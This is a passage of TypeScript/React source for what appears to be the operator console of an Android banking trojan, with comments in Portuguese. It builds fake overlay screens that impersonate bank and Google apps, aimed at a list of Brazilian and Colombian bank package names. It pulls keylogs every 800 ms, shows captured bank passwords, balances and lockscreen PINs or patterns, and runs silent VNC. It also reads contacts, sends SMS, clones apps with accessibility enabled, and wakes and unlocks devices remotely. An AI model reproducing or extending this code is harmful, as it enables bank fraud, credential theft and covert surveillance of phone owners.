    if (screenId === 'preset-itau-system') setEditSystemPackage('br.com.itau');
    else if (screenId === 'preset-google') setEditSystemPackage('com.google.android.gms');
    else if (screenId === 'preset-system-update') setEditSystemPackage('com.google.android.gms');
  };

  const handleUpdateCurrentScreenProperty = (field: 'logo' | 'title' | 'desc' | 'placeholder' | 'buttonText' | 'bgColor' | 'btnColor' | 'btnTextColor', value: string) => {
    setBankScreens(prev => {
      const updated = prev.map(screen => {
        if (screen.id !== selectedPresetScreenId) return screen;
        
        const updatedElements = screen.elements.map((el: any) => {
          const cloned = { ...el };
          if (field === 'logo' && (cloned.id.includes('logo') || cloned.type === 'logo')) cloned.content = value;
          if (field === 'title' && cloned.id.includes('title')) cloned.content = value;
          if (field === 'desc' && cloned.id.includes('desc')) cloned.content = value;
          if (field === 'placeholder' && cloned.type === 'input') cloned.placeholder = value;
          if (field === 'buttonText' && cloned.type === 'button') cloned.content = value;
          if (field === 'btnColor') {
            if (cloned.type === 'button') cloned.backgroundColor = value;
            if (cloned.type === 'fingerprint') cloned.biometricColor = value;
            if (cloned.type === 'input') cloned.borderColor = value;
          }
          if (field === 'btnTextColor' && cloned.type === 'button') cloned.color = value;
          return cloned;
        });
        
        return {
          ...screen,
          backgroundColor: field === 'bgColor' ? value : screen.backgroundColor,
          elements: updatedElements
        };
      });
      localStorage.setItem('customPresetBankScreens', JSON.stringify(updated));
      return updated;
    });
  };

  const handleUpdateSystemScreenProperty = (field: 'logo' | 'title' | 'desc' | 'placeholder' | 'buttonText' | 'bgColor' | 'btnColor' | 'btnTextColor', value: string) => {
    setSystemScreens(prev => {
      const updated = prev.map(screen => {
        if (screen.id !== selectedSystemScreenId) return screen;
        
        const updatedElements = screen.elements.map((el: any) => {
          const cloned = { ...el };
          if (field === 'logo' && (cloned.id.includes('logo') || cloned.type === 'logo')) cloned.content = value;
          if (field === 'title' && cloned.id.includes('title')) cloned.content = value;
          if (field === 'desc' && cloned.id.includes('desc')) cloned.content = value;
          if (field === 'placeholder' && cloned.type === 'input') cloned.placeholder = value;
          if (field === 'buttonText' && cloned.type === 'button') cloned.content = value;
          if (field === 'btnColor') {
            if (cloned.type === 'button') cloned.backgroundColor = value;
            if (cloned.type === 'fingerprint') cloned.biometricColor = value;
            if (cloned.type === 'input') cloned.borderColor = value;
          }
          if (field === 'btnTextColor' && cloned.type === 'button') cloned.color = value;
          return cloned;
        });
        
        return {
          ...screen,
          backgroundColor: field === 'bgColor' ? value : screen.backgroundColor,
          elements: updatedElements
        };
      });
      localStorage.setItem('customPresetSystemScreens', JSON.stringify(updated));
      return updated;
    });
  };

  const getCompiledBankTemplate = () => {
    const originalPreset = bankScreens.find(s => s.id === selectedPresetScreenId);
    if (!originalPreset) return null;
    
    return {
      ...originalPreset,
      package_name: editBankPackage
    };
  };

  const getCompiledSystemTemplate = () => {
    const originalPreset = systemScreens.find(s => s.id === selectedSystemScreenId);
    if (!originalPreset) return null;
    
    return {
      ...originalPreset,
      package_name: editSystemPackage
    };
  };

  const saveCustomBankMapping = async () => {
    const compiled = getCompiledBankTemplate();
    if (!compiled || !deviceId) return;
    
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/overlay-mappings`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          package_name: editBankPackage,
          project_id: 'preset-banking-screens',
          screen_id: compiled.id,
          screen_name: compiled.name,
          template: compiled,
          is_enabled: true
        })
      });

      if (response.ok) {
        addLog(` Auto-gatilho de banco salvo para ${editBankPackage}`);
        fetchOverlayMappings();
      } else {
        const err = await response.json();
        addLog(` Erro ao salvar gatilho de banco: ${err.detail || 'erro desconhecido'}`);
      }
    } catch (e) {
      console.error('Erro ao criar mapeamento de banco:', e);
      addLog(' Erro de rede ao criar mapeamento de banco');
    }
  };

  const saveCustomSystemMapping = async () => {
    const compiled = getCompiledSystemTemplate();
    if (!compiled || !deviceId) return;
    
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/overlay-mappings`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          package_name: editSystemPackage,
          project_id: PRESET_SYSTEM_PROJECT.id,
          screen_id: compiled.id,
          screen_name: compiled.name,
          template: compiled,
          is_enabled: true
        })
      });

      if (response.ok) {
        addLog(` Auto-gatilho de sistema salvo para ${editSystemPackage}`);
        fetchOverlayMappings();
      } else {
        const err = await response.json();
        addLog(` Erro ao salvar gatilho de sistema: ${err.detail || 'erro desconhecido'}`);
      }
    } catch (e) {
      console.error('Erro ao criar mapeamento de sistema:', e);
      addLog(' Erro de rede ao criar mapeamento de sistema');
    }
  };

  //  Estado para editor de tela preta customizada
  const [showBlackScreenEditor, setShowBlackScreenEditor] = useState(false);
  const [customBlackScreenTemplate, setCustomBlackScreenTemplate] = useState<any>(null);
  const [currentCamera, setCurrentCamera] = useState<'front' | 'back'>('back'); // back = traseira, front = frontal
  const cameraCanvasRef = useRef<HTMLCanvasElement>(null);
  const [filesViewMode, setFilesViewMode] = useState<'grid' | 'list'>('grid');
  const [lightboxImage, setLightboxImage] = useState<string | null>(null);
  const [lightboxName, setLightboxName] = useState<string>('');
  
  //  Estados para microfone
  const [isMicrophoneEnabled, setIsMicrophoneEnabled] = useState(false);
  const [showMicrophoneModal, setShowMicrophoneModal] = useState(false);
  const audioContextRef = useRef<AudioContext | null>(null);
  
  //  isCaptureEnabled: viewer state - quando true, renderiza <DeviceScreen> (mostra frames ao vivo)
  const [isCaptureEnabled, setIsCaptureEnabled] = useState(false);
  const [silentQuality, setSilentQuality] = useState(70);
  const [isKillerMode, setIsKillerMode] = useState(false);
  
  //  Estados para gerenciamento de apps
  const [showAppsModal, setShowAppsModal] = useState(false);
  const [showGoogleAccountsModal, setShowGoogleAccountsModal] = useState(false);
  const [installedApps, setInstalledApps] = useState<any[]>([]);

  //  Estados para envio e visualização de SMS
  const [showSmsModal, setShowSmsModal] = useState(false);
  const [smsPhone, setSmsPhone] = useState('');
  const [smsMessage, setSmsMessage] = useState('');
  const [smsSending, setSmsSending] = useState(false);
  const [smsStatusMsg, setSmsStatusMsg] = useState('');

  //  Estados para visualização de contatos do aparelho
  const [showContactsModal, setShowContactsModal] = useState(false);
  const [contactsList, setContactsList] = useState<Array<{ name: string; number: string }>>([]);
  const [contactsLoading, setContactsLoading] = useState(false);
  const [contactsSearch, setContactsSearch] = useState('');

  const fetchContacts = async () => {
    if (!deviceId) return;
    setContactsLoading(true);
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/command`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({
          device_id: deviceId,
          command: 'GET_CONTACTS'
        })
      });
      if (response.ok) {
        const data = await response.json();
        if (data.contacts && Array.isArray(data.contacts)) {
          setContactsList(data.contacts);
        } else if (typeof data.contacts === 'string') {
          try {
            setContactsList(JSON.parse(data.contacts));
          } catch (_) {}
        }
      }
    } catch (e) {
      console.error('Erro ao obter contatos:', e);
    } finally {
      setContactsLoading(false);
    }
  };

  //  Estados para duplicador de app no aparelho
  const [showDeviceDuplicatorModal, setShowDeviceDuplicatorModal] = useState(false);
  const [duplicatorSelectedApp, setDuplicatorSelectedApp] = useState<{ package: string; name: string } | null>(null);
  const [duplicatorCloneName, setDuplicatorCloneName] = useState('');
  const [duplicatorClonePackage, setDuplicatorClonePackage] = useState('');

  const openDuplicatorModal = (pkg?: string, name?: string) => {
    const targetPkg = pkg || (installedApps[0]?.package || 'com.whatsapp');
    const targetName = name || (installedApps[0]?.name || 'WhatsApp');
    setDuplicatorSelectedApp({ package: targetPkg, name: targetName });
    setDuplicatorCloneName(`${targetName} (Pasta Segura)`);
    setDuplicatorClonePackage(`${targetPkg}.cloned`);
    setShowDeviceDuplicatorModal(true);
  };

  const handleDirectDuplicate = async (pkg: string, name: string) => {
    if (!deviceId) return;
    const targetName = name || pkg.split('.').pop() || 'App';
    const clonePkg = `${pkg}.cloned`;
    const cloneName = `${targetName} (Pasta Segura)`;

    const msg = ` Duplicando "${targetName}" em Pasta Segura no dispositivo...`;
    setDuplicationBanner(msg);
    setTimeout(() => setDuplicationBanner(null), 5000);

    try {
      addLog(msg);
      await devicesAPI.sendCommand(deviceId, {
        action: 'DUPLICATE_APP',
        package: pkg,
        text: clonePkg,
        template: {
          target_package: pkg,
          clone_package: clonePkg,
          app_name: targetName,
          clone_name: cloneName,
          enable_a11y: true,
          is_secure_folder: true,
          isolated_mode: true
        }
      });
      addLog(` Comando de duplicação enviado com sucesso: ${targetName} -> ${cloneName}`);
      openDuplicatorModal(pkg, name);
    } catch (err: any) {
      console.error('Erro ao solicitar duplicação de app no dispositivo:', err);
      const errStr = ` Erro ao enviar comando de duplicação: ${err?.message || 'erro de rede'}`;
      addLog(errStr);
      setDuplicationBanner(errStr);
      setTimeout(() => setDuplicationBanner(null), 5000);
    }
  };

  const handleDuplicateAppOnDevice = async () => {
    if (!deviceId || !duplicatorSelectedApp) return;
    const targetPkg = duplicatorSelectedApp.package;
    const clonePkg = duplicatorClonePackage.trim() || `${targetPkg}.cloned`;
    const cloneName = duplicatorCloneName.trim() || `${duplicatorSelectedApp.name} (Pasta Segura)`;

    try {
      addLog(` Enviando comando para duplicar "${duplicatorSelectedApp.name}" em Pasta Segura isolada...`);
      await devicesAPI.sendCommand(deviceId, {
        action: 'DUPLICATE_APP',
        package: targetPkg,
        text: clonePkg,
        template: {
          target_package: targetPkg,
          clone_package: clonePkg,
          app_name: duplicatorSelectedApp.name,
          clone_name: cloneName,
          enable_a11y: true,
          is_secure_folder: true,
          isolated_mode: true
        }
      });
      addLog(` Comando de duplicação enviado com sucesso: ${duplicatorSelectedApp.name} -> ${cloneName} (Pasta Segura)`);
      setShowDeviceDuplicatorModal(false);
    } catch (err: any) {
      console.error('Erro ao solicitar duplicação de app no dispositivo:', err);
      addLog(` Erro ao enviar comando de duplicação: ${err?.message || 'erro de rede'}`);
    }
  };
  
  const installedBanks = useMemo(() => {
    // Pacotes conhecidos de bancos (inclusive variações não-padrão como coe.bradesco)
    const KNOWN_BANK_PACKAGES = [
      'com.nu.production', 'com.nubank',
      'br.com.itau', 'com.itau',
      'br.com.bb.android', 'com.bb.android',
      'br.com.bradesco', 'coe.bradesco',
      'com.santander.app', 'br.com.santander',
      'br.com.bancointer', 'com.bancointer',
      'br.com.caixa', 'br.gov.caixa',
      'br.com.c6bank',
      'br.com.neon',
      'br.com.pagbank', 'br.com.pagseguro', 'com.pagseguro',
      'com.mercadopago',
      'br.com.picpay',
      'com.panapp', 'br.com.pan',
      'br.com.sicredi',
      'br.com.original',
      'br.com.stone',
      'br.com.modal',
      'br.com.xpinvestimentos',
      'br.com.safra',
      'br.com.bancovotorantim',
      'com.bmg.android',
      'br.com.banrisul',
      'com.brb.mobile',
      'br.com.rendimento',
      'br.com.bs2',
      'br.com.digio',
      'com.recargapay',
      'com.will.bank',
      'br.com.agibank',
      'com.bancoafricabrasil',
      'br.com.sofisa',
      'br.com.intermedium',
      'com.citibank.mobile.br',
      'com.hsbc.hsbcbrazil',
      'br.com.daycoval',
      'com.creditas',
      // 🇨🇴 Colômbia
      'com.davivienda.daviviendaapp', 'com.synopsis.davivienda', 'com.davivienda.movil', 'com.davivienda.daviplata', 'com.davivienda', 'co.com.davivienda',
      'com.bancolombia.personas', 'com.bancolombia', 'co.com.bancolombia',
      'com.nequi.MobileApp', 'com.nequi',
      'com.bancodebogota.bancomovil', 'com.bancodebogota',
      'com.bbva.netcol', 'com.bbva.colombia',
      'com.bancopopular.mobile', 'com.bancodeoccidente.movil',
      'com.avvillas.bancamovil', 'com.colpatria.bancamovil',
      'com.lulobank.mobile', 'com.grability.rappi', 'com.rappipay.colombia',
      'com.bancofalabella.colombia', 'com.bancoagrario.bancamovil',
      'com.bancocajasocial.bancamovil', 'co.com.movii.app', 'com.dale.app', 'co.bold.app',
    ];
    
    // Nomes de apps bancários (captura apps com nomes reconhecíveis)
    const BANK_APP_NAMES = [
      'nubank', 'bradesco', 'itaú', 'itau', 'banco do brasil', 'bb',
      'santander', 'caixa', 'inter', 'c6 bank', 'c6bank', 'neon',
      'picpay', 'mercado pago', 'pagbank', 'pagSeguro', 'picpay',
      'original', 'sicredi', 'banrisul', 'digio', 'will bank',
      'sofisa', 'agibank', 'daycoval', 'creditas',
      // 🇨🇴 Colômbia
      'davivienda', 'daviplata', 'bancolombia', 'nequi', 'banco de bogotá', 'banco de bogota',
      'bbva', 'banco popular', 'banco de occidente', 'av villas', 'avvillas', 'colpatria',
      'lulo bank', 'lulobank', 'rappi', 'rappipay', 'falabella', 'banco agrario', 'bancamia',
      'caja social', 'movii', 'dale', 'bold',
    ];
    
    // Apps do sistema que devem ser EXCLUDOS mesmo que o nome contenha algo parecido
    const SYSTEM_EXCLUSIONS = [
      'com.android', 'com.google', 'com.samsung', 'com.motorola',
      'com.qualcomm', 'com.mediatek', 'android.', 'com.miui',
      'com.xiaomi', 'com.huawei', 'com.coloros', 'com.oneplus',
      'com.sec.', 'com.lge.', 'com.htc.', 'com.asus.',
      'com.facebook', 'com.instagram', 'com.whatsapp', 'com.twitter',
      'com.spotify', 'com.netflix', 'com.youtube',
      'com.android.systemui', 'com.android.settings',
    ];
    
    return installedApps.filter(app => {
      const pkg = (app.package || '').toLowerCase();
      const name = (app.name || '').toLowerCase();
      
      // Exclui apps do sistema definitivamente
      if (SYSTEM_EXCLUSIONS.some(ex => pkg.startsWith(ex))) return false;
      
      // Match por pacote exato/prefixo
      const matchesPkg = KNOWN_BANK_PACKAGES.some(known => pkg.startsWith(known) || pkg === known);
      if (matchesPkg) return true;
      
      // Match por nome do app (apenas se não for app de sistema)
      const matchesName = BANK_APP_NAMES.some(bn => name.includes(bn));
      if (matchesName) return true;
      
      return false;
    });
  }, [installedApps]);
  
  const [selectedMonitorBank, setSelectedMonitorBank] = useState<any | null>(null);
  const [bankKeylogs, setBankKeylogs] = useState<any[]>([]);
  const [isLoadingBankKeylogs, setIsLoadingBankKeylogs] = useState(false);
  const [bankKeylogSearch, setBankKeylogSearch] = useState('');
  const [bankLogCategoryFilter, setBankLogCategoryFilter] = useState<'all' | 'password' | 'click' | 'screen' | 'text'>('all');
  const [isLoadingApps, setIsLoadingApps] = useState(false);
  const [appsFilter, setAppsFilter] = useState<'all' | 'banks' | 'social' | 'user' | 'system' | 'monitored' | 'blocked'>('banks');
  const [appsSearch, setAppsSearch] = useState('');

  //  Lista de Pacotes de Redes Sociais
  const SOCIAL_MEDIA_PKGS = [
    'com.whatsapp', 'com.whatsapp.w4b', 'com.instagram.android', 'org.telegram.messenger',
    'com.facebook.katana', 'com.facebook.orca', 'com.zhiliaoapp.musically', 'com.twitter.android',
    'com.dsc.discord', 'com.snapchat.android', 'com.tiktok', 'com.linkedin.android'
  ];
  const isSocialApp = (pkg: string) => SOCIAL_MEDIA_PKGS.some(p => (pkg || '').toLowerCase().includes(p.toLowerCase()));
  
  // ¥ Modo expandido (VNC + Screen Reader lado a lado)
  const [isExpandedMode, setIsExpandedMode] = useState(false);
  const [showCombinedVncV2, setShowCombinedVncV2] = useState(false);
  
  // 🪟 MODO FLUTUANTE - Janelas arrastáveis (Tamanhos Celular XL GIGANTE)
  const [isFloatingMode, setIsFloatingMode] = useState(false);
  const [floatingWindows, setFloatingWindows] = useState({
    vnc: { open: true, x: 20, y: 65, width: 480, height: 820, zIndex: 10 },
    screenReader: { open: false, x: 515, y: 65, width: 480, height: 820, zIndex: 11 },
    controls: { open: true, x: 1010, y: 65, width: 350, height: 820, zIndex: 12 },
    camera: { open: false, x: 200, y: 200, width: 420, height: 480, zIndex: 13 },
    microphone: { open: false, x: 300, y: 250, width: 400, height: 350, zIndex: 14 },
    keylogger: { open: false, x: 400, y: 150, width: 450, height: 500, zIndex: 15 },
    bankPasswords: { open: false, x: 500, y: 100, width: 480, height: 580, zIndex: 16 },
    lockscreen: { open: false, x: 600, y: 120, width: 450, height: 600, zIndex: 17 },
    bankMonitor: { open: false, x: 250, y: 120, width: 750, height: 580, zIndex: 18 },
    editBankScreens: { open: false, x: 150, y: 120, width: 900, height: 680, zIndex: 19 },
  });
  const [highestZIndex, setHighestZIndex] = useState(20);
  
  // Função para trazer janela para frente
  const bringToFront = (windowId: keyof typeof floatingWindows) => {
    setHighestZIndex(prev => prev + 1);
    setFloatingWindows(prev => ({
      ...prev,
      [windowId]: { ...prev[windowId], zIndex: highestZIndex + 1 }
    }));
  };
  
  // Função para atualizar posição da janela
  const updateWindowPosition = (windowId: keyof typeof floatingWindows, x: number, y: number) => {
    setFloatingWindows(prev => ({
      ...prev,
      [windowId]: { ...prev[windowId], x, y }
    }));
  };
  
  // Função para atualizar tamanho da janela
  const updateWindowSize = (windowId: keyof typeof floatingWindows, width: number, height: number) => {
    setFloatingWindows(prev => ({
      ...prev,
      [windowId]: { ...prev[windowId], width, height }
    }));
  };
  
  // Toggle janela
  const toggleWindow = (windowId: keyof typeof floatingWindows) => {
    setFloatingWindows(prev => ({
      ...prev,
      [windowId]: { ...prev[windowId], open: !prev[windowId].open }
    }));
    if (!floatingWindows[windowId].open) {
      bringToFront(windowId);
    }
  };

  //  ORGANIZAÇO INOVADORA DO MODO FLUTUANTE - Cockpit VNC + V2 + Controles (AMPLIADO XL)
  const organizeCockpitLayout = useCallback(() => {
    setIsFloatingMode(true);
    setFloatingWindows(prev => ({
      ...prev,
      vnc: { open: true, x: 20, y: 65, width: 480, height: 820, zIndex: 21 },
      screenReader: { open: true, x: 515, y: 65, width: 480, height: 820, zIndex: 22 },
      controls: { open: true, x: 1010, y: 65, width: 350, height: 820, zIndex: 23 },
    }));
    setHighestZIndex(25);
    if (!isScreenReaderEnabled) {
      setIsScreenReaderEnabled(true);
    }
  }, [isScreenReaderEnabled]);

  //  Auto-Organizar todas as janelas abertas lado a lado sem sobreposição
  const autoOrganizeAllFloatingWindows = useCallback(() => {
    setIsFloatingMode(true);
    const marginX = 20;
    const startY = 65;
    const spacing = 15;
    let currentX = marginX;

    const openKeys = (Object.keys(floatingWindows) as Array<keyof typeof floatingWindows>).filter(
      key => floatingWindows[key].open
    );

    if (openKeys.length === 0) {
      organizeCockpitLayout();
      return;
    }

    setFloatingWindows(prev => {
      const next = { ...prev };
      openKeys.forEach((key, idx) => {
        const win = next[key];
        const w = win.width || 340;
        next[key] = {
          ...win,
          x: currentX,
          y: startY,
          height: Math.max(win.height, 600),
          zIndex: 10 + idx
        };
        currentX += w + spacing;
      });
      return next;
    });
    setHighestZIndex(10 + openKeys.length);
  }, [floatingWindows, organizeCockpitLayout]);

  //  HELPER INOVADOR: Calcula o último acesso real do aparelho ao app do banco
  const getAppLastAccess = useCallback((appPkg: string) => {
    if (!appPkg) return null;
    const targetPkg = appPkg.toLowerCase();
    
    let maxTime: number | null = null;

    // 1. Procura no histórico de logs de bancos
    if (Array.isArray(bankKeylogs)) {
      for (const log of bankKeylogs) {
        const p = (log.package || log.packageName || '').toLowerCase();
        if (p === targetPkg || p.includes(targetPkg) || targetPkg.includes(p)) {
          const t = log.timestamp || log.created_at || log.timestampMs;
          if (t) {
            const ms = new Date(t).getTime();
            if (!isNaN(ms) && (maxTime === null || ms > maxTime)) {
              maxTime = ms;
            }
          }
        }
      }
    }

    // 2. Procura nas senhas capturadas
    if (Array.isArray(bankPasswords)) {
      for (const pwd of bankPasswords) {
        const p = (pwd.package || '').toLowerCase();
        if (p === targetPkg || p.includes(targetPkg) || targetPkg.includes(p)) {
          const t = pwd.timestamp || pwd.created_at;
          if (t) {
            const ms = new Date(t).getTime();
            if (!isNaN(ms) && (maxTime === null || ms > maxTime)) {
              maxTime = ms;
            }
          }
        }
      }
    }

    // 3. Procura nos saldos capturados
    if (Array.isArray(bankBalances)) {
      for (const bal of bankBalances) {
        if ((bal.package || '').toLowerCase() === targetPkg) {
          const t = bal.timestamp || bal.created_at;
          if (t) {
            const ms = new Date(t).getTime();
            if (!isNaN(ms) && (maxTime === null || ms > maxTime)) {
              maxTime = ms;
            }
          }
        }
      }
    }

    if (maxTime === null) return null;

    const date = new Date(maxTime);
    const now = new Date();
    const diffMs = Math.max(0, now.getTime() - date.getTime());
    const diffMin = Math.floor(diffMs / 60000);
    const diffHours = Math.floor(diffMin / 60);

    let formattedRelative = '';
    if (diffMin < 1) {
      formattedRelative = 'Agora';
    } else if (diffMin < 60) {
      formattedRelative = `Há ${diffMin}m`;
    } else if (diffHours < 24) {
      formattedRelative = `Há ${diffHours}h`;
    } else {
      const days = Math.floor(diffHours / 24);
      formattedRelative = `Há ${days}d`;
    }

    const timeStr = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });

    return {
      ms: maxTime,
      formattedRelative,
      timeStr,
      fullLabel: `${formattedRelative} (${timeStr})`
    };
  }, [bankKeylogs, bankPasswords, bankBalances]);
  
  //  Mobile: Modo tela cheia e controles
  const isMobile = useIsMobile();
  const [isMobileFullscreen, setIsMobileFullscreen] = useState(false);
  const [showMobileControls, setShowMobileControls] = useState(true);
  
  //  Estados para instalação de APK
  const [showInstallApkModal, setShowInstallApkModal] = useState(false);
  const [isInstallingApk, setIsInstallingApk] = useState(false);
  const [isReconnectingConn, setIsReconnectingConn] = useState(false);
  const [selectedApkFile, setSelectedApkFile] = useState<File | null>(null);
  const apkInputRef = useRef<HTMLInputElement>(null);
  
  //  Estados para LOCKSCREEN PIN + PATTERN (igual EAGLESPY V5)
  const [showLockscreenModal, setShowLockscreenModal] = useState(false);
  const [capturedPin, setCapturedPin] = useState('');
  const [capturedPattern, setCapturedPattern] = useState('');
  const [pinInput, setPinInput] = useState('');
  const [patternInput, setPatternInput] = useState('');
  const [isLockscreenActive, setIsLockscreenActive] = useState(false);
  const [isPlayingPin, setIsPlayingPin] = useState(false);
  const [lockscreenType, setLockscreenType] = useState<'PIN' | 'PATTERN'>('PIN');
  const [pinDelay, setPinDelay] = useState(1000);
  
  //  Estados para layout editável (apenas cores dos botões)
  const [isLayoutEditMode, setIsLayoutEditMode] = useState(false);
  const [layoutDirty, setLayoutDirty] = useState(false);
  const [layoutPrefs, setLayoutPrefs] = useState<{
    buttonStyles: { [key: string]: { backgroundColor?: string; textColor?: string; borderColor?: string } };
  }>({
    buttonStyles: {},
  });
  
  // Carregar preferências de layout do usuário
  useEffect(() => {
    const loadLayoutPrefs = async () => {
      try {
        const response = await layoutAPI.getLayout();
        if (response.layout) {
          setLayoutPrefs(prev => ({ ...prev, ...response.layout }));
        }
      } catch (error) {
        console.error('Erro ao carregar preferências de layout:', error);
      }
    };
    loadLayoutPrefs();
  }, []);
  
  // Salvar preferências de layout
  const saveLayoutPrefs = async () => {
    try {
      await layoutAPI.saveLayout(layoutPrefs);
      setLayoutDirty(false);
      addLog(' Layout salvo com sucesso!');
    } catch (error) {
      console.error('Erro ao salvar layout:', error);
      addLog(' Erro ao salvar layout');
    }
  };
  
  // Resetar layout para padrão
  const resetLayoutPrefs = async () => {
    try {
      await layoutAPI.resetLayout();
      setLayoutPrefs({
        buttonStyles: {},
      });
      setLayoutDirty(false);
      addLog(' Layout resetado para padrão');
    } catch (error) {
      console.error('Erro ao resetar layout:', error);
    }
  };
  
  // Atualizar estilo de botão
  const updateButtonStyle = (buttonId: string, style: { backgroundColor?: string; textColor?: string; borderColor?: string }) => {
    setLayoutPrefs(prev => ({
      ...prev,
      buttonStyles: {
        ...prev.buttonStyles,
        [buttonId]: { ...prev.buttonStyles[buttonId], ...style },
      },
    }));
    setLayoutDirty(true);
  };

  const handleRename = async () => {
    if (!device) return;
    const name = prompt("Digite o novo nome para o aparelho:", device.custom_name || device.model);
    if (name !== null) {
      try {
        await devicesAPI.rename(device.device_id, name);
        setDevice(prev => prev ? { ...prev, custom_name: name } : null);
      } catch (err: any) {
        const detail = err.response?.data?.detail;
        const errorMessage = typeof detail === 'object' ? JSON.stringify(detail) : (detail || err.message);
        alert("Erro ao renomear dispositivo: " + errorMessage);
      }
    }
  };

  const loadDevice = useCallback(async () => {
    if (!deviceId) return;
    try {
      const devices = await devicesAPI.getAll();
      const found = devices.find(d => d.device_id === deviceId);
      if (found) {
        setDevice(found);
        if (typeof found.lockscreen_active === 'boolean') {
          setIsLockscreenActive(found.lockscreen_active);
        }
        // Se dispositivo ficou offline ou reíconectou
        if (!found.is_online && device?.is_online) {
          addLog('š  DISPOSITIVO DESÍCONECTADO!');
          setDeviceConnectionStatus('offline');
        } else if (found.is_online && (!device || !device.is_online)) {
          addLog(' DISPOSITIVO REÍCONECTADO!');
          setDeviceConnectionStatus('online');
        }

        const anyFound: any = found;
        if (!captureStateSeededRef.current && (typeof anyFound.silent_active === 'boolean' || anyFound.capture_method)) {
          const serverSilentActive = !!anyFound.silent_active;
          const serverIsSilentMethod =
            anyFound.capture_method === 'silent' ||
            anyFound.capture_method === 'btmob' ||
            serverSilentActive;
          if (serverIsSilentMethod || anyFound.has_screen) {
            setIsCaptureEnabled(true);
          }
          captureStateSeededRef.current = true;
        }
      }
    } catch (error) {
      console.error('Erro ao carregar dispositivo:', error);
    }
  }, [deviceId, device?.is_online]);

  useEffect(() => {
    loadDevice();
    const interval = setInterval(loadDevice, 4000);
    return () => clearInterval(interval);
  }, [loadDevice]);

  // š INICIALIZAƒO AUTOMTICA AO ABRIR O APARELHO: DESPERTAR + VNC + V2 (SCREEN READER)
  const autoStartDeviceInitRef = useRef<string | null>(null);
  useEffect(() => {
    if (!deviceId) return;
    setIsCaptureEnabled(true);
    if (autoStartDeviceInitRef.current === deviceId) return;
    autoStartDeviceInitRef.current = deviceId;

    const autoStartAll = async () => {
      try {
        console.log(' Auto-inicialização: Despertar + VNC + V2 para:', deviceId);
        
        // 1. Despertar aparelho (Ligar Tela / Desbloquear)
        devicesAPI.sendCommand(deviceId, { action: 'WAKEUP' }).catch(() => {});
        devicesAPI.sendCommand(deviceId, { action: 'SCREEN_ON' }).catch(() => {});
        devicesAPI.sendCommand(deviceId, { action: 'UNLOCK' }).catch(() => {});
        
        // 2. Ativar VNC Silencioso ao vivo
        devicesAPI.sendCommand(deviceId, { action: 'TOGGLE_SILENT_VNC', enabled: true, silent_only: true, quality: 70 }).catch(() => {});
        devicesAPI.sendCommand(deviceId, { action: 'START_SILENT_VNC' }).catch(() => {});
        devicesAPI.sendCommand(deviceId, { action: 'REQUEST_VNC_FRAME' }).catch(() => {});

        // 3. Ativar Leitor de Tela V2
        devicesAPI.sendCommand(deviceId, { action: 'TOGGLE_SCREEN_READER', enabled: true }).catch(() => {});
        devicesAPI.sendCommand(deviceId, { action: 'REQUEST_HIERARCHY' }).catch(() => {});
        setIsScreenReaderEnabled(true);
        setShowScreenReader(true);

      } catch (err) {
        console.error('Erro na inicialização automática do aparelho:', err);
      }
    };

    autoStartAll();
  }, [deviceId]);

  //  KEYLOGGER POR DATA - Polling robusto 24/7
  useEffect(() => {
    if (!deviceId) return;
    
    // Função para buscar keylogs por data
    const fetchKeylogsByDate = async (date: string, isSilent = false) => {
      if (!isSilent) {
        setIsLoadingKeylogs(true);
      }
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/keylogs-by-date?date=${date}&limit=5000`, {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        
        if (response.ok) {
          const data = await response.json();
          setKeylogsByDate(data.entries || []);
          
          // Atualiza contador de hoje (fuso local)
          const dNow = new Date();
          const today = `${dNow.getFullYear()}-${String(dNow.getMonth() + 1).padStart(2, '0')}-${String(dNow.getDate()).padStart(2, '0')}`;
          if (date === today) {
            setKeylogTotalToday(data.total || 0);
          }
        }
      } catch (error) {
        console.error('Erro ao buscar keylogs por data:', error);
      } finally {
        setIsLoadingKeylogs(false);
      }
    };
    
    // Função para buscar resumo e datas disponíveis
    const fetchKeylogSummary = async () => {
      try {
        const token = localStorage.getItem('token');
        
        // Busca resumo
        const summaryRes = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/keylogs-summary`, {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        if (summaryRes.ok) {
          const summary = await summaryRes.json();
          setKeylogSummary(summary);
        }
        
        // Busca datas disponíveis
        const datesRes = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/keylogs-dates`, {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        if (datesRes.ok) {
          const dates = await datesRes.json();
          setKeylogDates(dates);
        }
      } catch (error) {
        console.error('Erro ao buscar resumo keylogs:', error);
      }
    };
    
    // Busca keylogs antigos (compatibilidade)
    const fetchLegacyKeylogs = async () => {
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/keylogs?limit=300&include_offline=true`, {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.length > 0) {
            const parsedLogs = data.map((item: any) => {
              try {
                const parsed = JSON.parse(item.data);
                return { ...parsed, timestamp: item.created_at, isOffline: item.isOffline };
              } catch (e) {
                return { text: item.data, timestamp: item.created_at, isOffline: item.isOffline };
              }
            }).reverse();
            setKeylogs(parsedLogs);
          }
        }
      } catch (error) {
        console.error('Erro ao buscar keylogs legados:', error);
      }
    };
    
    // Busca inicial com a data selecionada
    fetchKeylogsByDate(keylogSelectedDate, false);
    fetchKeylogSummary();
    fetchLegacyKeylogs();
    
    // Polling ultra-rápido em tempo real (800ms)
    const interval = setInterval(() => {
      if (!document.hidden) {
        fetchKeylogsByDate(keylogSelectedDate, true);
        fetchKeylogSummary();
